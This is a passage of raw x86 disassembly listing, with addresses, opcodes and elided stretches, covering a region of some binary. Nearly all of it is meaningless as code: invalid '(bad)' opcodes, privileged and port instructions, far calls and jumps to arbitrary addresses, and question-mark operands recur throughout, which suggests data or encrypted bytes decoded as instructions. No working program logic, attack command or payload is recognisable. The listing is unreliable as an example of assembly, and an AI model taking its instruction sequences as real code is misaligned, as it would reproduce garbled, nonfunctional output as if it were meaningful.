  42bbbd:	adc    BYTE PTR [esi],cl
  42bbbf:	push   ebx
  42bbc0:	xor    al,0xeb
  42bbc2:	pop    edi
  42bbc3:	test   al,0xfd
  42bbc5:	or     DWORD PTR [edx-0x64],ebx
  42bbc8:	jae    0x42bbb4
  42bbca:	inc    esi
  42bbcb:	(bad)  
  42bbcc:	dec    eax
  42bbcd:	(bad)  
  42bbce:	dec    ecx
  42bbcf:	fadd   DWORD PTR [eax+esi*2+0xae99815]
  42bbd6:	jmp    0x42bbe7
  42bbd8:	retf   
  42bbd9:	push   DWORD PTR [ebp-0x70767987]
  42bbdf:	jbe    0x42bc22
  42bbe1:	les    edi,FWORD PTR fs:[eax]
  42bbe4:	and    BYTE PTR [ebx-0x6a809953],0x25
  42bbeb:	enter  0x2cf6,0x0
	...
  42bc53:	add    BYTE PTR [eax],al
  42bc55:	add    BYTE PTR [eax+ebp*1],dh
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	push   esp
  42bc63:	xlat   BYTE PTR ds:[ebx]
  42bc64:	dec    esi
  42bc65:	stos   DWORD PTR es:[edi],eax
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    BYTE PTR [ebx-0xcb04d19],bl
  42bc73:	ficomp DWORD PTR [esi]
  42bc75:	outs   dx,DWORD PTR ds:[esi]
  42bc76:	int    0xc9
  42bc78:	or     cl,BYTE PTR [esi]
  42bc7a:	loop   0x42bc29
  42bc7c:	xchg   DWORD PTR [esi+ecx*2-0x40],ecx
  42bc80:	mov    ds:0x491e0b15,al
  42bc85:	add    bl,BYTE PTR [eax]
  42bc87:	push   0x46a5b6da
  42bc8c:	mov    eax,ds:0x4c911bf
  42bc91:	push   es
  42bc92:	test   eax,0x2a426731
  42bc97:	jb     0x42bc33
  42bc99:	jg     0x42bd00
  42bc9b:	addr16 bnd jb 0x42bca5
  42bc9f:	dec    ebx
  42bca0:	mov    al,0x63
  42bca2:	fistp  WORD PTR [eax-0x70]
  42bca5:	mov    eax,0x2041ad5c
  42bcaa:	lahf   
  42bcab:	jae    0x42bc53
  42bcad:	enter  0xf10c,0x29
  42bcb1:	mov    edi,0xc8996a39
  42bcb6:	ins    DWORD PTR es:[edi],dx
  42bcb7:	xor    al,0xfe
  42bcb9:	out    0x34,eax
  42bcbb:	sysexit 
  42bcbd:	push   ds
  42bcbe:	test   al,0x9d
  42bcc0:	call   0x52710abc
  42bcc5:	jns    0x42bcbe
  42bcc7:	loope  0x42bcfb
  42bcc9:	cli    
  42bcca:	jo     0x42bd27
  42bccc:	jae    0x42bce5
  42bcce:	mov    ecx,0x5521917
  42bcd3:	pop    ecx
  42bcd4:	push   es
  42bcd5:	ror    BYTE PTR [ecx],cl
  42bcd7:	xchg   esp,eax
  42bcd8:	xchg   edi,eax
  42bcd9:	fcmovb st,st(4)
  42bcdb:	jbe    0x42bd10
  42bcdd:	aad    0xcc
  42bcdf:	mov    WORD PTR [ebp+0x7],?
  42bce2:	adc    ecx,DWORD PTR fs:[esi+eiz*4+0x57]
  42bce7:	or     BYTE PTR [edx+0x19],al
  42bcea:	add    DWORD PTR [ebx-0x4c],eax
  42bced:	xor    al,0xc
  42bcef:	and    DWORD PTR [eax+0x7f],0x5d798104
  42bcf6:	or     eax,0xfdda9d82
  42bcfb:	lods   eax,DWORD PTR ds:[esi]
  42bcfc:	cmp    al,0xa8
  42bcfe:	cli    
  42bcff:	popa   
  42bd00:	stos   DWORD PTR es:[edi],eax
  42bd01:	pop    ebx
  42bd02:	mov    ebp,0xf2b83553
  42bd07:	cmp    edi,DWORD PTR [edi]
  42bd09:	jno    0x42bcda
  42bd0b:	pop    ds
  42bd0c:	xchg   esi,eax
  42bd0d:	push   ecx
  42bd0e:	cmp    DWORD PTR [esi],ebx
  42bd10:	pushf  
  42bd11:	dec    edx
  42bd12:	aad    0x35
  42bd14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd15:	es aaa 
  42bd17:	nop
  42bd18:	adc    al,0xc1
  42bd1a:	jp     0x42bcde
  42bd1c:	cmp    dl,dl
  42bd1e:	(bad)  
  42bd20:	push   ds
  42bd21:	dec    esi
  42bd22:	xchg   ecx,ebx
  42bd24:	sub    al,0x4d
  42bd26:	stos   DWORD PTR es:[di],eax
  42bd28:	hlt    
  42bd29:	cmp    al,0x15
  42bd2b:	hlt    
  42bd2c:	out    0xd9,eax
  42bd2e:	xchg   esp,eax
  42bd2f:	jl     0x42bd4f
  42bd31:	in     eax,dx
  42bd32:	mov    ch,0x5
  42bd35:	enter  0x6c53,0xaa
  42bd39:	mov    eax,ds:0x34da38f4
  42bd3e:	push   ebx
  42bd3f:	jns    0x42bd95
  42bd41:	inc    ebx
  42bd42:	mov    dh,0x48
  42bd44:	add    DWORD PTR [eax],ebp
  42bd46:	xlat   BYTE PTR ds:[ebx]
  42bd47:	lods   al,BYTE PTR ds:[esi]
  42bd48:	mov    esi,DWORD PTR [esi-0x3c]
  42bd4b:	and    esi,eax
  42bd4d:	mov    eax,ds:0xe49ec4fb
  42bd52:	inc    esp
  42bd53:	jns    0x42bd80
  42bd55:	cmc    
  42bd56:	lods   al,BYTE PTR ds:[esi]
  42bd57:	ins    BYTE PTR es:[edi],dx
  42bd58:	add    eax,0xec140358
  42bd5d:	sub    BYTE PTR [edi],cl
  42bd5f:	les    ecx,FWORD PTR [eax+0x46]
  42bd62:	mov    ebp,0xbdae9bed
  42bd67:	and    DWORD PTR [ecx],ebx
  42bd69:	daa    
  42bd6a:	jae    0x42bd35
  42bd6c:	les    ecx,FWORD PTR [eax+eax*1+0x0]
	...
  42bdd3:	add    BYTE PTR [eax],al
  42bdd5:	add    BYTE PTR [eax-0x61eb634a],dh
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42be2a
  42bde3:	js     0x42be47
  42bde5:	adc    eax,0x1d667
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	stos   BYTE PTR es:[edi],al
  42bdef:	push   cs
  42bdf0:	push   edi
  42bdf1:	and    al,0x5d
  42bdf3:	push   cs
  42bdf4:	inc    eax
  42bdf5:	jmp    0x42be53
  42bdf7:	inc    ecx
  42bdf8:	sbb    bh,ah
  42bdfa:	repz adc cl,al
  42bdfd:	mov    edi,DWORD PTR [ebx+0x34bcf2f5]
  42be03:	fstp   QWORD PTR [esi+0x70]
  42be06:	fisub  DWORD PTR ds:0x60fa845d
  42be0c:	sbb    DWORD PTR [edi],esi
  42be0e:	xor    ch,BYTE PTR [ebx]
  42be10:	adc    al,0xd1
  42be12:	xchg   ebp,eax
  42be13:	mov    esp,0x9cccf61d
  42be18:	lods   al,BYTE PTR ds:[esi]
  42be19:	mov    ebp,0xa9998ee1
  42be1e:	mov    ah,0xc6
  42be20:	fistp  DWORD PTR [ebx+0x11]
  42be23:	and    ebx,eax
  42be25:	pop    es
  42be26:	mov    ecx,0xb5009988
  42be2b:	dec    edx
  42be2c:	retf   0x4393
  42be2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be30:	mov    esi,ebp
  42be32:	bound  esi,QWORD PTR [ecx+0x7c]
  42be35:	xor    BYTE PTR [ebx-0x4d],ah
  42be38:	xor    dl,BYTE PTR [edi]
  42be3a:	dec    ebp
  42be3b:	pop    ebp
  42be3c:	ins    BYTE PTR es:[edi],dx
  42be3d:	inc    eax
  42be3e:	leave  
  42be3f:	xor    dh,ah
  42be41:	and    DWORD PTR [ebx],edx
  42be43:	xchg   esi,eax
  42be44:	outs   dx,BYTE PTR ds:[esi]
  42be45:	mov    edx,0x472efb08
  42be4a:	pop    ss
  42be4b:	neg    bh
  42be4d:	or     BYTE PTR [edi+0x4dfd3e6c],al
  42be53:	jno    0x42be96
  42be55:	or     BYTE PTR [ebp+0x24907af0],ch
  42be5b:	lds    ecx,FWORD PTR [edi-0x4d0f340c]
  42be61:	pop    ecx
  42be62:	jbe    0x42beae
  42be64:	push   cs
  42be65:	popa   
  42be66:	mov    ?,eax
  42be68:	jmp    0x763a:0xb07
  42be6e:	mov    bl,dh
  42be70:	mov    ecx,0x67ade467
  42be75:	mov    edi,0x81b567e1
  42be7a:	push   esi
  42be7b:	fcom   DWORD PTR [ecx]
  42be7d:	lods   eax,DWORD PTR ds:[esi]
  42be7e:	mov    al,0x43
  42be80:	jae    0x42be7e
  42be82:	stos   BYTE PTR es:[edi],al
  42be83:	mov    edi,0x97f2ff9a
  42be88:	sbb    eax,0x3d86cdc9
  42be8d:	pop    es
  42be8e:	adc    BYTE PTR [ebp+0x3e],ch
  42be91:	icebp  
  42be92:	or     esp,ebx
  42be94:	cmp    dh,BYTE PTR [eax+eiz*4+0x2b0efb5e]
  42be9b:	enter  0xb7df,0x3e
  42be9f:	ret    
  42bea0:	mov    bl,BYTE PTR [esi]
  42bea2:	mov    ds:0x7207ff1b,eax
  42bea7:	push   esi
  42bea8:	aad    0x48
  42beaa:	adc    bl,BYTE PTR [esi]
  42beac:	xchg   edx,eax
  42bead:	cmp    DWORD PTR [ebp+0x73],0xffffffcd
  42beb1:	mov    bh,dh
  42beb3:	add    al,0xee
  42beb5:	sti    
  42beb6:	loopne 0x42be86
  42beb8:	sub    BYTE PTR [ecx-0x2dbf58f6],dl
  42bebe:	loopne 0x42bf22
  42bec0:	retf   
  42bec1:	iret   
  42bec2:	imul   DWORD PTR [eax]
  42bec4:	fisubr WORD PTR [edx+0x65]
  42bec7:	repz lock pop esp
  42beca:	mov    DWORD PTR [eax-0x337a3228],edx
  42bed0:	imul   edi,DWORD PTR [ecx],0x5a
  42bed3:	fistp  DWORD PTR [eax]
  42bed5:	jle    0x42be85
  42bed7:	mov    ebp,0x8bc61a1e
  42bedc:	xlat   BYTE PTR ds:[ebx]
  42bedd:	xchg   ebx,eax
  42bede:	or     DWORD PTR cs:[eax+edi*8],0xd1d7421d
  42bee6:	int    0x63
  42bee8:	iret   
  42bee9:	inc    ebp
  42beea:	test   eax,0x7e27cf
	...
  42bf53:	add    BYTE PTR [eax],al
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bf9c
  42bf63:	into   
  42bf64:	(bad)  
  42bf65:	frstor [edi-0x29]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	pop    ds
  42bf6f:	je     0x42bfcd
  42bf71:	sbb    DWORD PTR [edi+0x6af26ec7],0x47
  42bf78:	cmc    
  42bf79:	push   ecx
  42bf7a:	fild   DWORD PTR [esi]
  42bf7c:	dec    esi
  42bf7d:	sub    esp,esp
  42bf7f:	mov    WORD PTR [ebp+0x6f],gs
  42bf82:	int    0x3e
  42bf84:	sbb    bh,bh
  42bf86:	sbb    ebp,DWORD PTR ds:0x6ffb24d5
  42bf8c:	pusha  
  42bf8d:	inc    edx
  42bf8e:	xchg   DWORD PTR ds:0x2ec7f10d,ecx
  42bf94:	shr    DWORD PTR [edx],0xe5
  42bf97:	popf   
  42bf98:	inc    ebp
  42bf99:	imul   edi,DWORD PTR [ecx],0x4e
  42bf9c:	add    al,0xde
  42bf9e:	jnp    0x42bf93
  42bfa0:	or     eax,0xc5ef4716
  42bfa5:	and    al,0xac
  42bfa7:	lahf   
  42bfa8:	adc    ebp,DWORD PTR [ebx]
  42bfaa:	div    BYTE PTR [edx+ecx*2+0x17a9a157]
  42bfb1:	(bad)  ds:0x7443f628
  42bfb7:	jnp    0x42c034
  42bfb9:	repz call 0x2a798c8c
  42bfbf:	lea    esi,[ebp+esi*8+0x7d]
  42bfc3:	and    ebp,esi
  42bfc5:	pop    edx
  42bfc6:	push   edx
  42bfc7:	inc    edi
  42bfc8:	fs push ds
  42bfca:	scas   eax,DWORD PTR es:[edi]
  42bfcb:	push   es
  42bfcc:	in     al,0xa3
  42bfce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bfcf:	daa    
  42bfd0:	iret   
  42bfd1:	iret   
  42bfd2:	in     al,0x9
  42bfd4:	test   ecx,ebx
  42bfd6:	adc    DWORD PTR [ebp-0x73d9a486],esp
  42bfdc:	sub    eax,0x84af8002
  42bfe1:	iret   
  42bfe2:	cmc    
  42bfe3:	mov    eax,0xc0db3979
  42bfe8:	mov    esi,DWORD PTR [eax]
  42bfea:	jnp    0x42c01b
  42bfec:	or     bh,BYTE PTR [ecx]
  42bfee:	jl     0x42bf84
  42bff0:	inc    esi
  42bff1:	or     eax,0x8a9d46d3
  42bff6:	clc    
  42bff7:	sub    cl,dl
  42bff9:	lahf   
  42bffa:	imul   ebx,esi,0x47b9b067
  42c000:	push   0xaf82818b
  42c005:	dec    esi
  42c006:	cli    
  42c007:	push   edi
  42c008:	pusha  
  42c009:	jno    0x42bf92
  42c00b:	mov    al,BYTE PTR [edi-0xdb09f52]
  42c011:	cmp    al,0x3b
  42c013:	add    ecx,DWORD PTR [eax+0x4c]
  42c016:	add    edx,0x84595326
  42c01c:	mov    ?,WORD PTR [ebp+0x1ae4b544]
  42c022:	mov    eax,0x5c5804e9
  42c027:	or     eax,0x5a732679
  42c02c:	iret   
  42c02d:	mov    esi,0x220b0de9
  42c032:	push   cs
  42c033:	div    BYTE PTR [eax-0x44]
  42c036:	cwde   
  42c037:	retf   
  42c038:	aas    
  42c039:	jbe    0x42c06d
  42c03b:	add    ch,ah
  42c03d:	std    
  42c03e:	sti    
  42c03f:	jb     0x42c0a5
  42c041:	adc    eax,0xb9bebb4a
  42c046:	jne    0x42c09a
  42c048:	dec    esp
  42c049:	leave  
  42c04a:	xchg   ecx,eax
  42c04b:	add    eax,0x61eb387b
  42c050:	rcl    ecx,cl
  42c052:	mov    ecx,0x34584de3
  42c057:	loope  0x42c019
  42c059:	mov    ah,0x35
  42c05b:	add    edi,esi
  42c05d:	pushf  
  42c05e:	inc    esi
  42c05f:	int    0x6a
  42c061:	push   es
  42c062:	sbb    DWORD PTR [edi-0x19a6c84a],edx
  42c068:	cmp    edx,DWORD PTR [edx-0xf8c9110]
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	mov    ebp,0x672dd70e
  42c0e7:	fadd   DWORD PTR [ecx]
  42c0e9:	add    BYTE PTR [eax],al
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [eax+0x43],al
  42c0f0:	inc    ecx
  42c0f1:	sbb    al,0x2f
  42c0f3:	neg    BYTE PTR [ecx+0x2dc44406]
  42c0f9:	jmp    0x1dad4d3c
  42c0fe:	push   ds
  42c0ff:	push   ds
  42c100:	hlt    
  42c101:	imul   ecx,ebx,0x9447f38b
  42c107:	cmp    cl,cl
  42c109:	mov    bh,0xa7
  42c10b:	inc    ebp
  42c10c:	into   
  42c10d:	and    BYTE PTR [ecx+0xd],0x7d
  42c111:	adc    DWORD PTR [edi],ebx
  42c113:	pop    edx
  42c114:	int3   
  42c115:	add    al,0x8d
  42c117:	adc    BYTE PTR [ecx-0x422497a8],bh
  42c11d:	popf   
  42c11e:	imul   esp,ebp,0x2d
  42c121:	mov    eax,0x48a6e181
  42c126:	arpl   dx,dx
  42c128:	hlt    
  42c129:	pop    ebp
  42c12a:	and    DWORD PTR [ecx+0x40],eax
  42c12d:	mov    DWORD PTR [bp+di],eax
  42c130:	mov    esi,0xa3e68fd6
  42c135:	(bad)  
  42c136:	push   cs
  42c137:	test   DWORD PTR [edx+ebx*1+0x34923c58],esi
  42c13e:	adc    esi,DWORD PTR [eax-0x22296033]
  42c144:	ss mov ah,0xee
  42c147:	adc    dh,BYTE PTR [edi+0x2b47ac9d]
  42c14d:	push   edi
  42c14e:	jo     0x42c1b7
  42c150:	in     al,dx
  42c151:	add    DWORD PTR ds:0xeac99eb8,edi
  42c157:	mov    eax,ds:0xfd25e498
  42c15c:	sbb    esp,DWORD PTR [edx-0x3d]
  42c15f:	out    dx,al
  42c160:	add    eax,0xc8b424c9
  42c165:	mov    ds:0xe1d563f6,al
  42c16a:	sub    ecx,ecx
  42c16c:	leave  
  42c16d:	(bad)  
  42c16e:	inc    ebx
  42c16f:	arpl   bp,si
  42c171:	and    DWORD PTR [ebx+0x49],ebx
  42c174:	outs   dx,BYTE PTR ds:[esi]
  42c175:	jmp    0x42c15e
  42c177:	adc    ch,ch
  42c179:	jnp    0x42c1b5
  42c17b:	pop    ecx
  42c17c:	cdq    
  42c17d:	mov    esp,0x881b646a
  42c182:	inc    ecx
  42c183:	xor    eax,0x9476714d
  42c188:	loop   0x42c1df
  42c18a:	xchg   ebx,eax
  42c18b:	data16 into 
  42c18d:	(bad)  
  42c18e:	fisubr WORD PTR [edi+0x48]
  42c191:	jge    0x42c122
  42c193:	inc    edi
  42c194:	xor    al,0x4f
  42c196:	and    DWORD PTR [ebp-0x3b6efbe1],edi
  42c19c:	xchg   edi,edx
  42c19e:	outs   dx,BYTE PTR ds:[esi]
  42c19f:	fsubr  QWORD PTR [ebx+0x4e9373dd]
  42c1a5:	jp     0x42c17e
  42c1a7:	dec    edi
  42c1a8:	or     DWORD PTR [edi+0x30c43901],eax
  42c1ae:	dec    ecx
  42c1af:	xor    ebp,edi
  42c1b1:	inc    ebp
  42c1b2:	push   cs
  42c1b3:	shl    DWORD PTR [ebp+0x3f6f65d1],cl
  42c1b9:	std    
  42c1ba:	inc    ebx
  42c1bb:	push   ebx
  42c1bc:	rol    DWORD PTR [ecx+0x1521d218],1
  42c1c2:	stos   BYTE PTR es:[edi],al
  42c1c3:	xor    DWORD PTR [ecx],0x69b107c3
  42c1c9:	sahf   
  42c1ca:	ins    DWORD PTR es:[edi],dx
  42c1cb:	repnz mov ch,0xca
  42c1ce:	xlat   BYTE PTR ds:[ebx]
  42c1cf:	cs cmp eax,0x73e61a10
  42c1d5:	inc    esp
  42c1d6:	mov    bl,0xeb
  42c1d8:	lahf   
  42c1d9:	and    BYTE PTR ds:0x67d67f31,ch
  42c1df:	adc    ecx,eax
  42c1e1:	ja     0x42c224
  42c1e3:	iret   
  42c1e4:	out    0x49,eax
  42c1e6:	adc    eax,0x54933f59
  42c1eb:	dec    esp
  42c1ec:	fcomp  QWORD PTR [esi+0x0]
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	ins    DWORD PTR es:[edi],dx
  42c263:	jmp    0x42c267
  42c265:	(bad)  
  42c266:	fld    DWORD PTR [bx+di]
  42c269:	add    BYTE PTR [eax],al
  42c26b:	add    DWORD PTR [eax],eax
  42c26d:	add    bh,ah
  42c26f:	cmp    al,0x46
  42c271:	pusha  
  42c272:	jle    0x42c1fd
  42c274:	mov    DWORD PTR [esp+ebp*2-0x3d65fde7],edx
  42c27b:	inc    esi
  42c27c:	push   esp
  42c27d:	ficom  WORD PTR [ebp-0x68]
  42c280:	inc    edi
  42c281:	out    0xad,eax
  42c283:	out    0xe3,al
  42c285:	test   eax,0xcb22c49a
  42c28a:	jg     0x42c2f2
  42c28c:	dec    esp
  42c28d:	cld    
  42c28e:	push   eax
  42c28f:	clc    
  42c290:	call   0x32e5e2ad
  42c295:	jne    0x42c2b9
  42c297:	mov    bh,0xf6
  42c299:	jp     0x42c22e
  42c29b:	jae    0x42c22f
  42c29d:	push   es
  42c29e:	cmc    
  42c29f:	sub    ecx,DWORD PTR [ecx-0x3a]
  42c2a2:	sub    BYTE PTR [edi-0x2e109d66],0xed
  42c2a9:	push   0x3b
  42c2ab:	sti    
  42c2ac:	pop    ebp
  42c2ad:	sbb    DWORD PTR [ebx+0x2970f9a3],0xe339219d
  42c2b7:	inc    esp
  42c2b8:	dec    ebp
  42c2b9:	push   ss
  42c2ba:	dec    esp
  42c2bb:	push   cs
  42c2bc:	loop   0x42c259
  42c2be:	loopne 0x42c267
  42c2c0:	mov    esi,0xea5d1a62
  42c2c5:	leave  
  42c2c6:	ret    0xb061
  42c2c9:	popa   
  42c2ca:	xor    dl,dh
  42c2cc:	adc    DWORD PTR [eax-0x75ebaff],ebx
  42c2d2:	ds pop edi
  42c2d4:	idiv   BYTE PTR [edi+ebp*1-0x6ab281a5]
  42c2db:	sti    
  42c2dc:	cmp    bl,BYTE PTR [esi]
  42c2de:	cli    
  42c2df:	das    
  42c2e0:	mov    edx,0xf90cc30c
  42c2e5:	aas    
  42c2e6:	or     BYTE PTR [edx+0x12],0x23
  42c2ea:	bndstx [ebx],bnd0
  42c2ed:	ins    DWORD PTR es:[edi],dx
  42c2ee:	sbb    ecx,DWORD PTR [edi-0x2e11dae3]
  42c2f4:	fs pop eax
  42c2f6:	daa    
  42c2f7:	xor    ch,BYTE PTR [edi+0x1f]
  42c2fa:	and    BYTE PTR [edi],dh
  42c2fc:	std    
  42c2fd:	daa    
  42c2fe:	cmp    al,BYTE PTR ds:0x7ccfc490
  42c304:	loopne 0x42c354
  42c306:	and    dh,ah
  42c308:	dec    edx
  42c309:	xchg   BYTE PTR [edx+0x33],ch
  42c30c:	jp     0x42c29a
  42c30e:	mov    edi,0xaf2237a7
  42c313:	les    ebp,FWORD PTR cs:[ecx]
  42c316:	mov    ecx,0xa4e69ce1
  42c31b:	int3   
  42c31c:	in     eax,dx
  42c31d:	adc    dl,BYTE PTR [ebx-0x39dbd289]
  42c323:	xlat   BYTE PTR ds:[ebx]
  42c324:	xchg   esi,eax
  42c325:	or     BYTE PTR [ecx+eax*4],dh
  42c328:	jecxz  0x42c37f
  42c32a:	push   es
  42c32b:	retf   
  42c32c:	loope  0x42c2b5
  42c32e:	scas   al,BYTE PTR es:[edi]
  42c32f:	fwait
  42c330:	dec    edx
  42c331:	call   0x6c88:0xf02b36df
  42c338:	dec    esp
  42c339:	out    dx,eax
  42c33a:	jl     0x42c2f1
  42c33c:	or     ebx,DWORD PTR [esi+0x71]
  42c33f:	pop    ebx
  42c340:	gs stos BYTE PTR es:[edi],al
  42c342:	push   es
  42c343:	push   edx
  42c344:	lea    esi,[edx]
  42c346:	js     0x42c322
  42c348:	push   ds
  42c349:	pop    ebx
  42c34a:	dec    ebp
  42c34b:	mul    dl
  42c34d:	and    al,0x34
  42c34f:	pop    ebx
  42c350:	push   esi
  42c351:	in     eax,0xc6
  42c353:	test   eax,0x907ae07f
  42c358:	popa   
  42c359:	ja     0x42c30b
  42c35b:	pusha  
  42c35c:	push   cs
  42c35d:	adc    DWORD PTR [ebx],0xadf69684
  42c363:	pop    esp
  42c364:	xor    BYTE PTR [ecx+eax*2+0x47bb43a4],0x1
  42c36c:	adc    eax,DWORD PTR [eax+eax*1+0x0]
	...
  42c3d4:	add    BYTE PTR [eax],al
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0xedde0df6
  42c3e5:	sbb    DWORD PTR [edi-0x26],esp
  42c3e8:	add    DWORD PTR [eax],eax
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	out    0x86,al
  42c3f0:	pop    esi
  42c3f1:	mov    ds,WORD PTR [esi+0x77fb33f4]
  42c3f7:	fst    DWORD PTR [edx]
  42c3f9:	mul    DWORD PTR [ebp-0x2]
  42c3fc:	inc    ebx
  42c3fd:	mov    ecx,0xcef139ed
  42c402:	mov    al,ds:0xf00d1973
  42c407:	add    eax,0xc25a4b1c
  42c40c:	pop    ss
  42c40d:	iret   
  42c40e:	mov    ebx,0x9ca48007
  42c413:	test   al,0x60
  42c415:	cmp    cl,BYTE PTR [edi]
  42c417:	scas   eax,DWORD PTR es:[edi]
  42c418:	pop    ss
  42c419:	jae    0x42c3e9
  42c41b:	outs   dx,BYTE PTR ds:[esi]
  42c41c:	add    bh,BYTE PTR ds:0xb63c92e6
  42c422:	push   ecx
  42c423:	push   ds
  42c424:	mov    eax,ds:0x5cd25b9b
  42c429:	or     DWORD PTR [ebp+0x73f9e077],ebx
  42c42f:	ret    0xbbb2
  42c432:	xchg   edx,eax
  42c433:	test   DWORD PTR [edx+ebp*4-0x3],ebx
  42c437:	ins    BYTE PTR es:[edi],dx
  42c438:	xchg   DWORD PTR [edx-0x64],ebp
  42c43b:	fmul   st(0),st
  42c43d:	or     al,0x5
  42c43f:	adc    edx,esp
  42c441:	(bad)  
  42c442:	aas    
  42c443:	ficom  WORD PTR [edi+eiz*2+0x13]
  42c447:	les    esi,FWORD PTR [edi+0x245c5d95]
  42c44d:	dec    esp
  42c44e:	maxps  xmm7,XMMWORD PTR [ebx-0x4dee8263]
  42c455:	mov    eax,ds:0x7c0897cf
  42c45a:	xor    ebx,DWORD PTR [ebx+0x47]
  42c45d:	push   ss
  42c45e:	xchg   ebx,eax
  42c45f:	js     0x42c415
  42c461:	and    al,BYTE PTR [ebp+0x44]
  42c464:	jne    0x42c48b
  42c466:	mov    es,WORD PTR [ebx]
  42c468:	adc    BYTE PTR [edx-0x38],dl
  42c46b:	outs   dx,BYTE PTR ds:[esi]
  42c46c:	int    0xd4
  42c46e:	pop    edx
  42c46f:	pop    ebx
  42c470:	pop    edi
  42c471:	mov    edi,0x72c39aca
  42c476:	jae    0x42c440
  42c478:	mov    eax,ebx
  42c47a:	mov    ebp,0xe7513a76
  42c47f:	hlt    
  42c480:	sub    edi,ebp
  42c482:	call   0x3a0fb3a6
  42c487:	retf   
  42c488:	pop    ds
  42c489:	cmc    
  42c48a:	fsubr  QWORD PTR [ebp-0x58]
  42c48d:	push   ss
  42c48e:	inc    ebp
  42c48f:	mov    ebp,edi
  42c491:	cmp    al,0x6e
  42c493:	pop    eax
  42c494:	aam    0xd7
  42c496:	addr16 lahf 
  42c498:	mov    eax,0xfd3fccfa
  42c49d:	sbb    al,BYTE PTR [edi+0x620e302f]
  42c4a3:	bound  edi,QWORD PTR [edx-0x50]
  42c4a6:	je     0x42c50c
  42c4a8:	sub    esp,DWORD PTR [ebx-0x2f99cb4a]
  42c4ae:	retf   0x926
  42c4b1:	into   
  42c4b2:	xlat   BYTE PTR ds:[ebx]
  42c4b3:	clc    
  42c4b4:	mov    eax,0x16299d3d
  42c4b9:	mov    ecx,0xbc3123f6
  42c4be:	dec    edi
  42c4bf:	outs   dx,BYTE PTR ds:[esi]
  42c4c0:	mov    ecx,0x49f9438e
  42c4c5:	outs   dx,DWORD PTR ds:[esi]
  42c4c6:	loop   0x42c46a
  42c4c8:	imul   eax,DWORD PTR [ecx+ebp*2],0x59
  42c4cc:	call   0xeada:0x85a17578
  42c4d3:	add    cl,dh
  42c4d5:	cld    
  42c4d6:	xor    cl,BYTE PTR [esi]
  42c4d8:	leave  
  42c4d9:	loope  0x42c47f
  42c4db:	jbe    0x42c529
  42c4dd:	mov    ecx,0x86adba6f
  42c4e2:	outs   dx,DWORD PTR ds:[esi]
  42c4e3:	or     al,0xa5
  42c4e5:	repnz push ss
  42c4e7:	test   eax,0x2ad21416
  42c4ec:	(bad)  
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xbe34,0x7
  42c564:	lods   eax,DWORD PTR ds:[esi]
  42c565:	in     al,dx
  42c566:	fild   DWORD PTR [bx+di]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [edi+0x61],ch
  42c570:	(bad)  
  42c571:	(bad)  
  42c572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c573:	cwde   
  42c574:	sub    eax,ebx
  42c576:	shr    DWORD PTR [esi],1
  42c578:	ja     0x42c56f
  42c57a:	gs push ss
  42c57c:	adc    bh,BYTE PTR [ecx]
  42c57e:	dec    edx
  42c57f:	call   0xfb22:0x43c91b71
  42c586:	(bad)  
  42c587:	retf   0xeffb
  42c58a:	or     al,cl
  42c58c:	test   BYTE PTR [ebp-0x3f65eed1],dl
  42c592:	rcl    BYTE PTR [edi-0x7e1503b0],cl
  42c598:	pop    eax
  42c599:	jle    0x42c525
  42c59b:	loope  0x42c52e
  42c59d:	fwait
  42c59e:	mov    ds:0x5ac0ec15,eax
  42c5a3:	std    
  42c5a4:	xor    al,0xf2
  42c5a6:	sbb    eax,0xe5e296d2
  42c5ab:	ds pop ecx
  42c5ad:	stos   BYTE PTR es:[edi],al
  42c5ae:	add    eax,DWORD PTR [eax]
  42c5b0:	sbb    BYTE PTR [eax+0x4df6653],ch
  42c5b6:	mov    bh,0x67
  42c5b8:	pop    DWORD PTR [esi-0x3e]
  42c5bb:	rcr    BYTE PTR [edi+edi*4-0x7c],1
  42c5bf:	mov    ebp,0x3fe0deb1
  42c5c4:	or     BYTE PTR [edi-0x748dca87],cl
  42c5ca:	loop   0x42c599
  42c5cc:	cmp    esp,0xc7620d62
  42c5d2:	cmp    DWORD PTR [edi],edx
  42c5d4:	sbb    eax,0xc5de6619
  42c5d9:	rcr    BYTE PTR [ebx-0x12],1
  42c5dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5dd:	sub    BYTE PTR [ecx-0x7f1a9ced],ah
  42c5e3:	aam    0x78
  42c5e5:	mov    eax,ds:0x755fd0e1
  42c5ea:	push   esp
